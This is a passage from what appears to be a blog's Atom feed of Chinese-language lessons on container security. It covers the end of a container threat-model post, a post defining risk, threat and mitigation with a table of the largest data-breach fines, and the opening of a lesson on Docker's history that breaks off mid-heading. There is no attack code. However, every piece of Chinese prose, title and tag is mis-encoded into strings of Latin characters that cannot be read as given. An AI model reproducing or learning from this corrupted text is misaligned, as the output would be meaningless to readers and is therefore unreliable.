ç»Ÿçš„éƒ¨ç½²ç¯å¢ƒä¸­ï¼Œæ‚¨éœ€è¦å®‰å…¨çš„ç½‘ç»œé…ç½®ã€é˜²ç«å¢™ä»¥åŠèº«ä»½è®¿é—®ç®¡ç†ç³»ç»Ÿæ¥ç¡®ä¿å®¿ä¸»æœºï¼ˆæˆ–è™šæ‹Ÿæœºï¼‰ä¸è¢«æ”»å‡»è€…æ‰€è®¿é—®ï¼Œè¿™äº›åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ä»ç„¶é€‚ç”¨ã€‚</li><li>å®¹å™¨é€šå¸¸åœ¨ä¸€äº›ç¼–æ’å·¥å…·ä¸­è¿è¡Œï¼Œä¾‹å¦‚ Kubernetesã€Docker Swarm æˆ– Hashicorp Nomadã€‚å¦‚æœè¿™äº›ç¼–æ’å·¥å…·çš„é…ç½®æ˜¯ä¸å®‰å…¨çš„ï¼Œé‚£ä¹ˆå…¶è®¿é—®æ§åˆ¶æ²¡æœ‰å¾—åˆ°æœ‰æ•ˆåœ°ç®¡ç†ï¼Œè¿™ä¹Ÿä¼šç»™æ”»å‡»è€…æä¾›é¢å¤–çš„æ”»å‡»è·¯å¾„ï¼Œä»è€Œå½±å“åˆ°éƒ¨ç½²ç¯å¢ƒçš„å®‰å…¨æ€§ã€‚</li></ol><p>æ­¤å¤–ï¼Œå¦‚æœæ‚¨å¯¹ Kubernetes éƒ¨ç½²ç¯å¢ƒä¸­çš„å¨èƒæ¨¡å‹æ„Ÿå…´è¶£ã€‚å¯ä»¥é˜…è¯»ä»¥ä¸‹èµ„æ–™ï¼š</p><ul><li>CNCF çš„<a href="https://web.archive.org/web/20190812032049/https://github.com/kubernetes/community/blob/master/wg-security-audit/findings/Kubernetes%20Threat%20Model.pdf" title="Kubernetes Threat Model">Kubernetes Threat Model</a></li><li>CNCF çš„é‡‘èç”¨æˆ·ç»„å‘å¸ƒçš„åŸºäº<a href="https://en.wikipedia.org/wiki/STRIDE_model" title="STRIDE">STRIDE</a>æ–¹æ³•åˆ›å»ºçš„<a href="https://github.com/cncf/financial-user-group/tree/main/projects/k8s-threat-model" title="Kubernetesæ”»å‡»æ ‘">Kubernetes æ”»å‡»æ ‘</a></li></ul><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬åˆ†äº«äº†å¯¹ç¯å¢ƒè¿›è¡Œå¨èƒå»ºæ¨¡çš„ç»Ÿä¸€çš„æ–¹æ³•å’Œæ€è·¯ï¼Œå³ï¼šè€ƒè™‘ç¯å¢ƒçš„å‚ä¸è€…æ˜¯è°ï¼Ÿä»–ä»¬å¯èƒ½å…·å¤‡çš„æƒé™åˆé›†æœ‰å“ªäº›ã€‚ç„¶åï¼Œæˆ‘ä»¬åŸºäºå®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸçš„å„ä¸ªé˜¶æ®µæ‰€æ½œåœ¨çš„æ”»å‡»å‘é‡ï¼Œå¯¹å®¹å™¨è¿›è¡Œäº†å¨èƒå»ºæ¨¡ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜æä¾›äº†è®¸å¤šæ‹“å±•é˜…è¯»çš„èµ„æ–™ï¼Œæ–¹ä¾¿è¯»è€…è‡ªè¡Œå­¦ä¹ ã€‚</p><p>å¾ˆå¤šäº‘åŸç”Ÿå®‰å…¨çˆ±å¥½è€…åœ¨ç¬¬ä¸€æ¬¡å­¦ä¹ äº‘åŸç”Ÿå®‰å…¨çš„æ—¶å€™ï¼Œè¦ä¹ˆä¸€å¤´æ‰è¿›æŠ€æœ¯ç»†èŠ‚ä¸­ï¼Œä»¥è‡³äºâ€œç®¡ä¸­çª¥è±¹ï¼Œå¯è§ä¸€æ–‘â€ï¼›è¦ä¹ˆæ²‰è¿·äºå„ç§é˜²æŠ¤ç†è®ºä½“ç³»ï¼Œæœ€ç»ˆæ— æ³•å°†æ–¹æ¡ˆè½åœ°ã€‚</p><p>æŒæ¡æŠ€æœ¯å®ç°çš„åŸºç¡€åŸç†ï¼ŒåŒæ—¶åˆæœ‰ä¸€ä¸ªå…¨å±€çš„é˜²æŠ¤è§‚å¯¹äºå­¦ä¹ äº‘åŸç”Ÿå®‰å…¨è€Œè¨€è‡³å…³é‡è¦ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ ¹æ®è¿™ä¸ªå®¹å™¨å¨èƒæ¨¡å‹ä¸€å±‚å±‚å‰–æå®¹å™¨é˜²æŠ¤çš„åŸºç¡€æŠ€æœ¯ä¸åŸç†ã€‚</p><p>æœ¬æ–‡å¹²è´§å¤šå¤šï¼Œå»ºè®®æ”¶è—ï½</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.1 é£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½</title>
    <link href="/2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/"/>
    <url>/2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>é£é™©ä¸å¨èƒæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿç¼“è§£æªæ–½å’Œå®ƒä»¬åˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿåœ¨å¯¹å®¹å™¨è¿›è¡Œå¨èƒå»ºæ¨¡ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆç®€å•è¯´æ˜ä¸€ä¸‹é£é™©ã€å¨èƒåŠç¼“è§£æªæ–½çš„åŸºæœ¬æ¦‚å¿µã€‚</p><h2 id="0x01-å®šä¹‰"><a href="#0x01-å®šä¹‰" class="headerlink" title="0x01 å®šä¹‰"></a>0x01 å®šä¹‰</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®šä¹‰ï¼š</p><ul><li>é£é™©ï¼ˆRiskï¼‰ï¼šæ½œåœ¨çš„é—®é¢˜ï¼Œä»¥åŠå¦‚æœé—®é¢˜å‘ç”Ÿä¼šé€ æˆçš„å½±å“ã€‚</li><li>å¨èƒï¼ˆThreatï¼‰ï¼šå¯¼è‡´é£é™©å‘ç”Ÿçš„é€”å¾„ã€‚</li><li>ç¼“è§£æªæ–½ï¼ˆMitigationï¼‰ï¼šå¯¹å¨èƒçš„åº”å¯¹æªæ–½ï¼Œå³ï¼šä½ å¯ä»¥é‡‡å–çš„å¯ä»¥ç”¨æ¥é˜²æ­¢å¨èƒæˆ–è‡³å°‘é™ä½å…¶æˆåŠŸçš„å¯èƒ½æ€§ã€‚</li></ul><p><img src="/image/image_bNAqfZU-KV.png" alt="å›¾ 1ï¼šé£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½ä¹‹é—´çš„å…³ç³»" title="å›¾1ï¼šé£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½ä¹‹é—´çš„å…³ç³»"></p><p>å‡è®¾ä¸€ä¸ªæƒ…æ™¯ï¼š<strong>æœ‰äººä»ä½ å®¶å·èµ°äº†è½¦é’¥åŒ™</strong>ã€‚é‚£ä¹ˆï¼š</p><ul><li>é£é™©ï¼ˆRiskï¼‰ï¼šä½ çš„è½¦å¯èƒ½ä¼šè¢«å¼€èµ°ã€‚</li><li>å¨èƒï¼ˆThreatï¼‰ï¼šå·å–é’¥åŒ™çš„ä¸åŒçš„æ–¹å¼ï¼Œä¾‹å¦‚ï¼šæ‰“ç ´çª—æˆ·ä¼¸æ‰‹æ‹¿ï¼›ç”¨é±¼ç«¿å°†å®ƒé’“èµ°ï¼›æ•²é—¨åˆ†æ•£ä½ çš„æ³¨æ„åŠ›ï¼ŒåŒæ—¶å¸®å‡¶è¿…é€Ÿæºœè¿›å®¶ä¸­æ‹¿èµ°é’¥åŒ™ã€‚</li><li>ç¼“è§£æªæ–½ï¼ˆMitigationï¼‰ï¼šè®©è½¦é’¥åŒ™ä¸è¦ç¦»å¼€ä½ çš„è§†çº¿ã€‚</li></ul><p><img src="/image/image_kxpNkk_vNI.png" alt="å›¾ 2ï¼šè‹¥è½¦é’¥åŒ™è¢«å·èµ°äº†ï¼Œå…¶é£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½æ‰€å¯¹åº”çš„äº‹é¡¹" title="å›¾2ï¼šè‹¥è½¦é’¥åŒ™è¢«å·èµ°äº†ï¼Œå…¶é£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½æ‰€å¯¹åº”çš„äº‹é¡¹"></p><h2 id="0x02-é£é™©ä¹‹é—´çš„å·®å¼‚"><a href="#0x02-é£é™©ä¹‹é—´çš„å·®å¼‚" class="headerlink" title="0x02 é£é™©ä¹‹é—´çš„å·®å¼‚"></a>0x02 é£é™©ä¹‹é—´çš„å·®å¼‚</h2><p><strong>é£é™©å› ç»„ç»‡è€Œå¼‚</strong>ï¼š</p><ul><li>å¯¹äºé“¶è¡Œè€Œè¨€ï¼Œé£é™©æ˜¯èµ„é‡‘è¢«ç›—å–ï¼›</li><li>å¯¹äºç”µå•†è€Œè¨€ï¼Œé£é™©æ˜¯äº¤æœŸè¢«æ¬ºè¯ˆï¼›</li><li>å¯¹äºç»è¥åšå®¢çš„ä¸ªäººå¼€å‘è€…è€Œè¨€ï¼Œé£é™©æ˜¯åˆ«äººå…¥ä¾µä»–ä»¬çš„ç½‘ç«™å¹¶ä¸”å‘å¸ƒä¸å½“è¨€è®ºã€‚</li></ul><p><strong>é£é™©ä¸ä»…å› å›½å®¶ä¹‹é—´çš„éšç§æ³•è§„ä¸åŒè€Œä¸åŒï¼Œè¿˜å› åœ°ç†ä½ç½®ä¸åŒè€Œä¸åŒ</strong>ï¼š</p><ul><li>åœ¨è®¸å¤šå›½å®¶ï¼Œæ³„éœ²å®¢æˆ·ä¸ªäººæ•°æ®ä»…ä¼šæŸå®³å£°èª‰ï¼Œ</li><li>è€Œåœ¨æ¬§æ´²ï¼Œ<a href="https://www.atlassian.com/zh/trust/compliance/resources/gdpr" title="é€šç”¨æ•°æ®ä¿æŠ¤æ¡ä¾‹ï¼ˆGeneral Data Protection Regulation ï¼ŒGDPRï¼‰"><strong>é€šç”¨æ•°æ®ä¿æŠ¤æ¡ä¾‹ï¼ˆGeneral Data Protection Regulationï¼ŒGDPRï¼‰</strong></a><a href="https://www.atlassian.com/zh/trust/compliance/resources/gdpr" title="å…è®¸çš„ç½šæ¬¾é«˜è¾¾å…¬å¸æ€»æ”¶å…¥çš„4%">å…è®¸çš„ç½šæ¬¾é«˜è¾¾å…¬å¸æ€»æ”¶å…¥çš„ 4%</a>ã€‚</li></ul><p><img src="/image/image_DktmbcMTiw.png" alt="å›¾ 3ï¼šç»´åŸºç™¾ç§‘ä¸Šå¯¹äº é€šç”¨æ•°æ®ä¿æŠ¤æ¡ä¾‹ çš„ä»‹ç»" title="å›¾3ï¼šç»´åŸºç™¾ç§‘ä¸Šå¯¹äº é€šç”¨æ•°æ®ä¿æŠ¤æ¡ä¾‹ çš„ä»‹ç»"></p><p>2019 å¹´ 7 æœˆï¼ŒCSO ç»Ÿè®¡äº†å› æ•°æ®æ³„æ¼æˆ–ä¸éµå®ˆå®‰å…¨æ³•è€Œå¤„ä»¥çš„æœ€é«˜ç½šæ¬¾çš„äº‹ä»¶ï¼Œæˆªæ­¢è‡³ 2024 å¹´ 4 æœˆ 26 æ—¥å…±æœ‰ 15 èµ·ï¼Œè¿™ä»½<a href="https://www.csoonline.com/article/567531/the-biggest-data-breach-fines-penalties-and-settlements-so-far.html" title="åå•">åå•</a>ä¼šéšç€ç›¸å…³å¤„ç½šçš„æ–°é—»å‡ºç°è€ŒæŒç»­æ›´æ–°ã€‚</p><table><thead><tr><th>åºå·</th><th>å…¬å¸</th><th>é‡‘é¢</th></tr></thead><tbody><tr><td>1</td><td>Metaï¼ˆFacebookï¼‰</td><td>13 äº¿ç¾å…ƒ</td></tr><tr><td>2</td><td>æ»´æ»´</td><td>11.9 äº¿ç¾å…ƒ</td></tr><tr><td>3</td><td>Amazon</td><td>8.77 äº¿ç¾å…ƒ</td></tr><tr><td>4</td><td>Equifax</td><td>5.75 äº¿ç¾å…ƒï¼ˆè‡³å°‘ï¼‰</td></tr><tr><td>5</td><td>Metaï¼ˆFacebookã€Instagramï¼‰</td><td>4.13 äº¿ç¾å…ƒ</td></tr><tr><td>6</td><td>Instagram</td><td>4.03 äº¿ç¾å…ƒ</td></tr><tr><td>7</td><td>TikTok</td><td>3.7 äº¿ç¾å…ƒ</td></tr><tr><td>8</td><td>T-Mobile</td><td>3.5 äº¿ç¾å…ƒ</td></tr><tr><td>9</td><td>Metaï¼ˆFacebookï¼‰</td><td>2.77 äº¿ç¾å…ƒ</td></tr><tr><td>10</td><td>WhatsApp</td><td>2.55 äº¿ç¾å…ƒ</td></tr><tr><td>11</td><td>Home Depot</td><td>çº¦ 2 äº¿ç¾å…ƒ</td></tr><tr><td>12</td><td>Capital One</td><td>1.9 äº¿ç¾å…ƒ</td></tr><tr><td>13</td><td>Uber</td><td>1.48 äº¿ç¾å…ƒ</td></tr><tr><td>14</td><td>Morgan Stanley</td><td>1.2 äº¿ç¾å…ƒï¼ˆæ€»è®¡ï¼‰</td></tr><tr><td>15</td><td>Google Ireland</td><td>1.02 äº¿ç¾å…ƒ</td></tr></tbody></table><h2 id="0x03-é£é™©ç®¡ç†ç³»ç»Ÿ"><a href="#0x03-é£é™©ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="0x03 é£é™©ç®¡ç†ç³»ç»Ÿ"></a>0x03 é£é™©ç®¡ç†ç³»ç»Ÿ</h2><p>ä¹Ÿæ­£å› ä¸ºé£é™©ä¹‹é—´å­˜åœ¨ç€è¾ƒå¤§çš„å·®å¼‚ï¼Œæ‰€ä»¥ä¸åŒçš„å¨èƒçš„ç›¸å¯¹é‡è¦ç¨‹åº¦ä¼šæœ‰æ‰€ä¸åŒï¼Œè¿›è€Œå¯¼è‡´ç¼“è§£æªæ–½ä¹Ÿä¸åŒã€‚<strong>ä¸ºäº†æä¾›ä¸€ä¸ªç³»ç»Ÿçš„æ€è€ƒé£é™©çš„è¿‡ç¨‹ï¼Œé£é™©ç®¡ç†æ¡†æ¶ï¼ˆrisk management frameworkï¼ŒRMFï¼‰åº”è¿è€Œç”Ÿ</strong>ï¼Œå®ƒèƒ½åˆ—ä¸¾å‡ºå„ç§å¨èƒã€ç¡®å®šé£é™©çš„é‡è¦æ€§å¹¶å®šä¹‰ç¼“è§£æªæ–½ã€‚</p><h2 id="0x04-å¨èƒæ¨¡å‹"><a href="#0x04-å¨èƒæ¨¡å‹" class="headerlink" title="0x04 å¨èƒæ¨¡å‹"></a>0x04 å¨èƒæ¨¡å‹</h2><p>ç”±äºå¨èƒæ˜¯é£é™©å‘ç”Ÿçš„é€”å¾„ï¼Œå¦‚ä½•è¯†åˆ«å¹¶åˆ—ä¸¾å‡ºç³»ç»Ÿæ½œåœ¨çš„å¨èƒè‡³å…³é‡è¦ã€‚<strong>å¨èƒæ¨¡å‹ï¼ˆThreat modelingï¼‰å¯ä»¥ç³»ç»Ÿåœ°æŸ¥çœ‹ç³»ç»Ÿç»„ä»¶å’Œå¯èƒ½çš„æ”»å‡»æ¨¡å¼ï¼Œä»¥å¸®åŠ©æ‚¨ç¡®å®šç³»ç»Ÿæœ€å®¹æ˜“å—åˆ°æ”»å‡»çš„ä½ç½®ã€‚</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ²¡æœ‰å•ä¸€çš„ç»¼åˆçš„å¨èƒæ¨¡å‹ï¼Œå› ä¸ºå¨èƒæ¨¡å‹è¿˜å–å†³äºé£é™©ã€ç‰¹å®šç¯å¢ƒã€ç»„ç»‡å’Œæ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºç­‰ç§ç§å› ç´ ã€‚è™½ç„¶å®¹å™¨çš„å¨èƒæ¨¡å‹ä¸èƒ½åˆ—å‡ºå…¨éƒ¨çš„å¨èƒï¼Œä½†å®ƒå¯ä»¥åˆ—å‡ºå¤§å¤šæ•°å®¹å™¨éƒ¨ç½²ç¯å¢ƒæ‰€å­˜åœ¨çš„ä¸€äº›å…±åŒçš„æ½œåœ¨å¨èƒã€‚</p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬é€šè¿‡æƒ…æ™¯å†ç°ï¼Œè§£é‡Šäº†é£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½çš„æ¦‚å¿µï¼Œå¹¶ä¸”æµè§ˆäº†å…¨çƒ Top 15 å› æ•°æ®æ³„éœ²æˆ–ä¸éµå®ˆå®‰å…¨å’Œéšç§æ³•è€Œå¤„ä»¥çš„æœ€é«˜ç½šæ¬¾å’Œç½šé‡‘çš„äº‹ä»¶ã€‚</p><p>ä¸ºäº†æä¾›ä¸€ä¸ªç³»ç»Ÿçš„æ€è€ƒé£é™©å’Œè¯†åˆ«å¨èƒçš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ç®€å•ä»‹ç»äº†é£é™©ç®¡ç†æ¡†æ¶å’Œå¨èƒæ¨¡å‹çš„å®šä¹‰ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æ²¡æœ‰ä¸€ä¸ªç»¼åˆçš„å¨èƒæ¨¡å‹ï¼Œä½†ä¸ºäº†è¯†åˆ«å‡ºå®¹å™¨éƒ¨ç½²ç¯å¢ƒæ‰€å­˜åœ¨çš„å¨èƒï¼Œå¯¹å®¹å™¨è¿›è¡Œå¨èƒå»ºæ¨¡ä»ç„¶æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–¹å¼ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ 1 è¯¾ å®¹å™¨å®‰å…¨å¨èƒå»ºæ¨¡</title>
    <link href="/2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"/>
    <url>/2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¿™äº›å¹´æ¥ï¼Œéšç€å®¹å™¨çš„ä½¿ç”¨ç‡å¤§å¹…åº¦å¢é•¿ï¼Œå¾ˆå¤šäººå°† Docker å’Œå®¹å™¨ç®€å•åœ°ç”»ä¸Šäº†ç­‰å·ï¼Œä½†æ—©åœ¨ Docker å´›èµ·ä¹‹å‰ï¼Œå®¹å™¨çš„æ¦‚å¿µå°±å·²ç»å­˜åœ¨äº†å¾ˆå¤šå¹´â€¦â€¦</p><h2 id="0x01-Docker-é—®ä¸–è®©å®¹å™¨å†æ¬¡â€œç¿»çº¢â€"><a href="#0x01-Docker-é—®ä¸–è®©å®¹å™¨å†æ¬¡â€œç¿»çº¢â€" class="headerlink" title="0x01 Docker é—®ä¸–è®©å®¹å™¨å†æ¬¡â€œç¿»çº¢â€"></a>0x01 Docker é—®ä¸–è®©å®¹å™¨å†æ¬¡â€œç¿»çº¢â€</h2><p>2013 å¹´ 3 æœˆ 15 æ—¥ï¼Œ<a href="https://pyvideo.org/pycon-us-2013/the-future-of-linux-containers.html" title="Docker çš„åˆ›å§‹äººSolomon Hykesåœ¨ PyCon ä¸Šé¦–æ¬¡å‘å…¨ä¸–ç•Œå…¬å¼€å±•ç¤ºäº† Docker">Docker çš„åˆ›å§‹äºº Solomon Hykes åœ¨ PyCon ä¸Šé¦–æ¬¡å‘å…¨ä¸–ç•Œå…¬å¼€å±•ç¤ºäº† Docker</a>ã€‚ä»–æŒ‡å‡ºäº†ï¼Œå¯¹äºå¼€å‘äººå‘˜æ¥è¯´ï¼Œå°†åº”ç”¨ç¨‹åºéƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šéå¸¸å›°éš¾ï¼Œå› æ­¤ä»–å’Œä»–çš„æ—©æœŸå›¢é˜Ÿè®¾è®¡äº† Dockerï¼Œä»¥å¸®åŠ©å¼€å‘è€…æ›´æ–¹ä¾¿åœ°åœ¨ä»»ä½•åœ°æ–¹æ„å»ºã€å…±äº«å’Œè¿è¡Œåº”ç”¨ç¨‹åºã€‚</p><p><img src="/image/image_LQiX5rts5g.png" alt="å›¾ 1ï¼šDocker çš„åˆ›å§‹äºº Solomon Hykes åœ¨ PyCon ä¸Šé¦–æ¬¡å‘å…¨ä¸–ç•Œå…¬å¼€å±•ç¤ºäº† Docker" title="å›¾ 1 ï¼šDocker çš„åˆ›å§‹äººSolomon Hykesåœ¨ PyCon ä¸Šé¦–æ¬¡å‘å…¨ä¸–ç•Œå…¬å¼€å±•ç¤ºäº† Docker"></p><p>æ­£å¦‚ Docker æœ€åˆçš„æ ‡è¯­â€œä¸€å¤„æ„å»ºï¼Œå¤„å¤„è¿è¡Œâ€æ‰€è¯´çš„é‚£æ ·ï¼Œå®¹å™¨å¯ä»¥å°†åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–ç­‰ä¸€åˆ‡æ‰€éœ€è¦çš„ä¸œè¥¿éƒ½æ‰“åŒ…åˆ°å®¹å™¨ä¸­ï¼Œç„¶åå°†å®¹å™¨å’Œå®¿ä¸»æœºçš„å…¶ä»–éƒ¨åˆ†éš”ç¦»å¼€æ¥ã€‚è¿™ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å„è‡ªçš„ä¸ªäººç”µè„‘æˆ–è€…æœåŠ¡å™¨ä¸Šè¿è¡Œç€ç›¸åŒçš„åº”ç”¨ç¨‹åºçš„é•œåƒäº†ã€‚Docker è¿™ç§ç®€å•æ˜“ç”¨çš„å‘½ä»¤è¡Œå·¥å…·çš„é—®ä¸–å¯¼è‡´å®¹å™¨å†æ¬¡â€œç¿»çº¢â€ï¼Œåœ¨å¼€å‘è€…ç¤¾åŒºä¸­è¿…é€Ÿé£é¡èµ·æ¥äº†ã€‚</p><p>Kubernetes ç¤¾åŒºèµ„æ·±æˆå‘˜ä¸é¡¹ç›®ç»´æŠ¤è€…å¼ ç£Šåœ¨ä»–çš„ä¹¦ã€Š<a href="https://book.douban.com/subject/35424872/" title="æ·±å…¥å‰–æ Kubernetes">æ·±å…¥å‰–æ Kubernetes</a>ã€‹ä¸­è¯´é“ï¼šâ€œ<strong>Docker é¡¹ç›®ç»™ PaaS ä¸–ç•Œå¸¦æ¥çš„â€˜é™ç»´æ‰“å‡»â€™ï¼Œå…¶å®æ˜¯æä¾›äº†ä¸€ç§éå¸¸ä¾¿åˆ©çš„æ‰“åŒ…æœºåˆ¶ã€‚è¿™ç§æœºåˆ¶ç›´æ¥æ‰“åŒ…äº†åº”ç”¨è¿è¡Œæ‰€éœ€è¦çš„æ•´ä¸ªæ“ä½œç³»ç»Ÿï¼Œä»è€Œä¿è¯äº†æœ¬åœ°ç¯å¢ƒå’Œäº‘ç«¯ç¯å¢ƒçš„é«˜åº¦ä¸€è‡´ï¼Œé¿å…äº†ç”¨æˆ·é€šè¿‡â€˜è¯•é”™â€™æ¥åŒ¹é…ä¸¤ç§ä¸åŒè¿è¡Œç¯å¢ƒä¹‹é—´å·®å¼‚çš„ç—›è‹¦è¿‡ç¨‹ã€‚</strong>â€</p><p><img src="/image/image_p2hPemXzhW.png" alt="å›¾ 2ï¼šè±†ç“£è¯»ä¹¦ä¸­çš„ã€Šæ·±å…¥å‰–æ Kubernetesã€‹ä»‹ç»" title="å›¾ 2 ï¼šè±†ç“£è¯»ä¹¦ä¸­çš„ã€Šæ·±å…¥å‰–æ Kubernetesã€‹ä»‹ç»"></p><h2 id="0x02-å®¹å™¨è§£å†³äº†åº”ç”¨ç¨‹åºçš„ä¾èµ–é—®é¢˜"><a href="#0x02-å®¹å™¨è§£å†³äº†åº”ç”¨ç¨‹åºçš„ä¾èµ–é—®é¢˜" class="headerlink" title="0x02 å®¹å™¨è§£å†³äº†åº”ç”¨ç¨‹åºçš„ä¾èµ–é—®é¢˜"></a>0x02 å®¹å™¨è§£å†³äº†åº”ç”¨ç¨‹åºçš„ä¾èµ–é—®é¢˜</h2><p>åœ¨å®¹å™¨å‡ºç°ä¹‹å‰ï¼Œä½ å¾ˆå®¹æ˜“ä¼šé™·å…¥ä¾èµ–å…³ç³»çš„å™©æ¢¦ä¸­å»ï¼Œå³ï¼š<strong>åŒä¸€ä¸»æœºä¸Šçš„ä¸¤ä¸ªåº”ç”¨ç¨‹åºéœ€è¦ä¾èµ–ç›¸åŒçš„è½¯ä»¶åŒ…çš„ä¸åŒç‰ˆæœ¬</strong>ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜å…¶å®å¾ˆç®€å•ï¼Œä½ åªè¦å°†åº”ç”¨ç¨‹åºéƒ¨ç½²åˆ°ä¸åŒçš„ä¸»æœºä¸Šå°±å¯ä»¥äº†ï¼Œä½†è¿™æ ·æœªå…ä¼šé€ æˆèµ„æºçš„æµªè´¹ã€‚</p><p>ä½†åªè¦æœ‰äº†å®¹å™¨ï¼Œä½ å¯ä»¥ç”¨æ›´åŠ é«˜æ•ˆçš„æ–¹æ¡ˆæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ï¼šå°†åº”ç”¨ç¨‹åºå®¹å™¨åŒ–ï¼Œéƒ¨ç½²åˆ°åŒä¸€å®¿ä¸»æœºçš„ä¸åŒå®¹å™¨ä¸­ã€‚å®¹å™¨çš„éš”ç¦»æœºåˆ¶å¯ä»¥è®©ä¾èµ–å…³ç³»å½¼æ­¤éš”ç¦»ï¼Œå³ï¼š<strong>ä½ åœ¨åŒä¸€å®¿ä¸»æœºä¸ŠåŒæ—¶è¿è¡Œå¤šä¸ªä¸åŒçš„å®¹å™¨è€Œä¸å—å¹²æ‰°</strong>ã€‚</p><h2 id="0x03-å®¹å™¨ç¼–æ’æ”¹å˜äº†åº”ç”¨ç¨‹åºçš„éƒ¨ç½²æ–¹å¼"><a href="#0x03-å®¹å™¨ç¼–æ’æ”¹å˜äº†åº”ç”¨ç¨‹åºçš„éƒ¨ç½²æ–¹å¼" class="headerlink" title="0x03 å®¹å™¨ç¼–æ’æ”¹å˜äº†åº”ç”¨ç¨‹åºçš„éƒ¨ç½²æ–¹å¼"></a>0x03 å®¹å™¨ç¼–æ’æ”¹å˜äº†åº”ç”¨ç¨‹åºçš„éƒ¨ç½²æ–¹å¼</h2><p>â€œå®¹å™¨å°±ä»ä¸€ä¸ªå¼€å‘è€…æ‰‹é‡Œçš„å°å·¥å…·ï¼Œä¸€è·ƒæˆä¸ºäº†äº‘è®¡ç®—é¢†åŸŸçš„ç»å¯¹ä¸»è§’ï¼›è€Œèƒ½å¤Ÿå®šä¹‰å®¹å™¨ç»„ç»‡å’Œç®¡ç†è§„èŒƒçš„â€˜å®¹å™¨ç¼–æ’â€™æŠ€æœ¯ï¼Œåˆ™å½“ä»ä¸è®©åœ°åä¸Šäº†å®¹å™¨æŠ€æœ¯é¢†åŸŸçš„â€˜å¤´æŠŠäº¤æ¤…â€™ã€‚â€</p><p><strong>åƒ Kubernetes è¿™æ ·çš„å®¹å™¨ç¼–æ’å·¥å…·å®Œç¾è§£å†³äº†ï¼šå¦‚ä½•è‡ªåŠ¨åŒ–åœ°å°†å®¹å™¨éƒ¨ç½²åˆ°æœåŠ¡å™¨é›†ç¾¤ä¸­ã€‚</strong> ä½ åªéœ€å‘Šè¯‰ç¼–æ’å·¥å…·ï¼Œä½ æƒ³è¦è¿è¡Œå“ªäº›å®¹å™¨ï¼Œå®ƒå°±ä¼šä¸ºæ¯ä¸€ä¸ªå®¹å™¨æ‰¾åˆ°ä¸€ä¸ªéå¸¸åˆé€‚çš„ä½ç½®ï¼Œè€Œæ— é¡»ä½ æ‰‹åŠ¨åœ°åœ¨ç‰¹å®šçš„ä¸»æœºä¸­å®‰è£…åº”ç”¨ç¨‹åºäº†ã€‚</p><p><img src="/image/image_N3Cq7QGOs5.png" alt="å›¾ 3ï¼šCI&#x2F;CD with Git, Jenkins, Ansible, Docker, Kubernetes on AWS" title="å›¾3ï¼šCI&#x2F;CD with Git, Jenkins, Ansible, Docker, Kubernetes on AWS"></p><h2 id="0x04-å®‰å…¨ç ”ç©¶å‘˜çš„æ€è€ƒ"><a href="#0x04-å®‰å…¨ç ”ç©¶å‘˜çš„æ€è€ƒ" class="headerlink" title="0x04 å®‰å…¨ç ”ç©¶å‘˜çš„æ€è€ƒ"></a>0x04 å®‰å…¨ç 